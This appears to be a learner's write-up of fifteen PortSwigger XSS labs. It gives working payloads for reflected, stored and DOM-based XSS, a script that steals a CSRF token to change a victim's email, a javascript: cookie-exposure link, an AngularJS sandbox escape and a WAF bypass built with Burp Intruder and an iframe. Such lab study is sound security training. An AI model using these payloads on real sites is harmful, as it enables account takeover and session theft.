# Cross-site Scripting (XSS)
Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious client-side scripts, typically JavaScript, into web pages viewed by other users.

## Labs completed

| # | Lab Name | Category | Status |
|---|---|---|---|
| 1 | Exploiting XSS to bypass CSRF defenses | XSS | ✅ Solved |
| 2 | Reflected XSS into HTML context with nothing encoded | XSS | ✅ Solved |
| 3 | Stored XSS into HTML context with nothing encoded | XSS | ✅ Solved |
| 4 | DOM XSS in document.write sink using source location.search | XSS | ✅ Solved |
| 5 | DOM XSS in innerHTML sink using source location.search | XSS | ✅ Solved |
| 6 | DOM XSS in jQuery anchor href attribute sink using location.search source | XSS | ✅ Solved |
| 7 | DOM XSS in jQuery selector sink using a hashchange event | XSS | ✅ Solved |
| 8 | Reflected XSS into attribute with angle brackets HTML-encoded | XSS | ✅ Solved |
| 9 | Stored XSS into anchor href attribute with double quotes HTML-encoded | XSS | ✅ Solved |
| 10 | Reflected XSS into a JavaScript string with angle brackets HTML encoded | XSS | ✅ Solved |
| 11 | DOM XSS in document.write sink using source location.search inside a select element | XSS | ✅ Solved |
| 12 | DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded | XSS | ✅ Solved |
| 13 | Reflected DOM XSS | XSS | ✅ Solved |
| 14 | Stored DOM XSS | XSS | ✅ Solved |
| 15 | Reflected XSS into HTML context with most tags and attributes blocked | XSS | ✅ Solved |

## Key Techniques

**Lab 1 — Exploiting XSS to bypass CSRF defenses**
Stored XSS in blog comments. Payload fetches victim's account page, 
extracts CSRF token using regex, then uses that token to submit a POST 
request changing the victim's email address — all executed silently 
in the victim's browser without their knowledge.
**Payload:**
```html
<script>
fetch('/my-account')
  .then(response => response.text())
  .then(html => {
    var token = html.match(/name="csrf" value="(\w+)"/)[1];
    fetch('/my-account/change-email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf=' + token + '&email=test2@test.com'
    });
  });
</script>
```

**Lab 2 - Reflected XSS into HTML context with nothing encoded**
Reflected XSS in search functionality. User input reflected directly into 
page HTML with zero escaping or filtering — payload executes immediately.
**Payload:**
```html
<script>alert('xss')</script>
```

**Lab 3 - Stored XSS into HTML context with nothing encoded**
Stored XSS in comment functionality. The comment reflected directly to someone who views it
**Payload:**
```html
<script>alert('xss')</script>
```

**Lab 4 - DOM XSS in document.write sink using source location.search**
DOM based XSS vulnerability lives in client side javascript, not in server. This lab had document.write() directly 
outputting location.search (the URL query parameter) without sanitization.
```html
"><script>alert('XSS')</script>
```
The "> closed the wrapping HTML tag, allowing the script to execute as code 
rather than being treated as data.

**Lab 5 - DOM XSS in innerHTML sink using source location.search**
DOM-based XSS vulnerability where JavaScript code uses innerHTML to write 
location.search (URL query parameter) directly into the page without sanitization.
Key difference from document.write: innerHTML doesn't execute <script> tags 
when inserted, so event handlers like onerror are more reliable.
```html
Payload: <img src=x onerror=alert('XSS')>
```
The broken image triggers the onerror event, executing the JavaScript payload.

**Lab 6 - DOM XSS in jQuery anchor href attribute sink using location.search source**
DOM-based XSS using jQuery. The code took the returnPath URL parameter 
and directly inserted it into a link's href attribute without sanitization.
```html
Payload: javascript:alert(document.cookie)
```
The javascript: scheme tells the browser to execute JavaScript when the link 
is clicked, rather than navigating to a URL. This exfiltrates the victim's cookies.

**Lab 8 - Reflected XSS into attribute with angle brackets HTML-encoded**
Reflected XSS in search functionality. User input reflected directly into 
page HTML with zero escaping or filtering — payload executes immediately.
This time the angle brackets get HTML encoded, so script tags will not work here.
```html
Payload: " autofocus onfocus="alert(1)
```

**Lab 9 - Stored XSS into anchor href attribute with double quotes HTML-encoded**
Stored XSS via the comment form's Website field. The value becomes the 
`href` attribute of the comment author's name link. Since double quotes are 
HTML-encoded, attribute-breakout with `"` doesn't work — but the `javascript:` 
URL scheme still executes when the link is clicked, no quote-breaking needed.
```html
Payload: javascript:alert(1)
```

**Lab 10 - Reflected XSS into a JavaScript string with angle brackets HTML encoded**
```html
Payload: '; alert(1);//
```

**Lab 11 - DOM XSS in document.write sink using source location.search inside a select element**
```html
Payload: https://...productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=x%20onerror=alert(1)%3E
```

**Lab 12 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**
```html
Payload: {{$on.constructor('alert(1)')()}}
```

**Lab 13 - Reflected DOM XSS**

**Methodology**
I got search bar, so I'm pretty sure that it's the way to interact with the website and inject the payload.
After checking the source code, I found a js file which processes the data. When I visited the file, I saw the first function with variable xhr which is making an http request, and a function with promise, so the promise expects the server response and stores it in variable searchResultsObj.
I typed "test" in search bar to check the server response.
Response: {"results":[],"searchTerm":"test"}
So the search we did was directly put in searchTerm without any sanitization. BINGO, found the vulnerability/flaw, because everything has a flaw. We just have to find it by observing, how I know? I just observed.
So now to exploit it and prepare for an attack with payload.
I searched with something abnormal to escape the searchTerm by closing it, but response added a back slash, that's the problem, we have to escape it too.
How? By back slash.
I noticed another thing when I used the first payload: ";alert(1);//
The first semicolon, because of it the payload didn't work. I checked the url with something encoded %3B, so I changed it by adding '-' and closing the curly braces.
```html
Payload: \"-alert(1)}//
```

**Lab 14 - Stored DOM XSS**

**Methodology and Hypothesis testing**
- Hypothesis 1: website field with `javascript:alert(1)`
result:- Failed because of client side validation
- Hypothesis 2: Bypass validation via Console with command `document.querySelector('input["website"]').value="javascript:alert(1)";`
result:- Failed, can't be bypassed by console on client side, means server is validating too
- Hypothesis 3: URL encoding trick with `https://javascript:alert(1)`
result:- Failed, treated as plain text URL, didn't execute
- Direction change - Investigate other input fields for vulnerability, found a function converting angle brackets to &lt and &gt. Trying comment body.
- Hypothesis 4: Comment body with `<img src=x onerror=alert(1)>`
result:- Failed, as it becomes `<p>&lt;img src=x onerror=alert(1)&gt;</p>`
- Hypothesis 5: Does it convert every angle brackets to &gt and &lt, looking at the function which replaces it, BINGO, found the vulnerability. `html.replace('<', '&lt;').replace('>', '&gt;');`
The replace method didn't use any global flag. So it converts only first occurrence of opening and closing angle brackets.
```javascript
Final payload: <><img src=x onerror=alert(1)>
```

**Lab 15 - Reflected XSS into HTML context with most tags and attributes blocked**

**Methodology**
So in this lab it is mentioned that vulnerability lies in search functionality but it is protected by WAF (Web Application Firewall) for common XSS vectors.

**Testing standard XSS payloads:**
```
<script>alert</script>
<img src=x onerror=alert()>
```
Both of these will get blocked by the firewall because it relies on signature-based filtering of high-profile tags like `<script>` and `<img>` while omitting structural layout tags like `<body>` and non-standard event handlers like `onresize`. 

Now we know that a firewall will block these with respect to a blocklist which contains all these tags or event listeners. But it is not protected against every tag or event listener, some of them will definitely pass through it. For that case we will use BurpSuite.

**Enumeration & Filtering Bypass**

Open BurpSuite and turn on the intercept button, make a simple search request in the lab like `hello`, once you hit click, BurpSuite will show the request containing the search query we are making. Select the search query and move it to the **Intruder** in burpSuite using `CTRL + I`. 

Now in PortSwigger XSS section, click this link - [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), so we can test which of the tags and event listeners will work on it. Click **Copy tags to clipboard** to test for tags.

In **Intruder**, in left side which is showing the request, we will change `GET /?search=$hello$ HTTP/2` to `GET /?search=<$$> HTTP/2`, and paste the tags in payload configuration. **Intruder** will brute force every tags inside `$$`. Also check off the **URL-encode these characters** in BurpSuite. We found that **body** tag is the one giving **200 OK** status. Similarly we will do this for event listeners by copying from cheatsheet, and we found out that **resize** also giving **200 OK** status.

If we craft a payload like `<body onresize=print()>`, it will not work because something needs to trigger resize too. We will use **iframe** tag for that. In **Go to exploit server** of lab, we make the final payload like:-
```
Payload: <iframe src="https://<LAB_ID>.web-security-academy.net/?search=<body onresize=print()>" onload="this.style.width='500px'"></iframe>
```
Now a question arises from this: **Why does the iframe tag not get blocked?**

The `<iframe>` resides on the attacker's origin to bypass target-side WAF restrictions on frame creation, using onload to programmatically trigger the target's internal onresize listener via CSS modification.

## Disclaimer
This is performed for educational use only on legal, intentionally vulnerable 
environments such as PortSwigger Web Security Academy labs.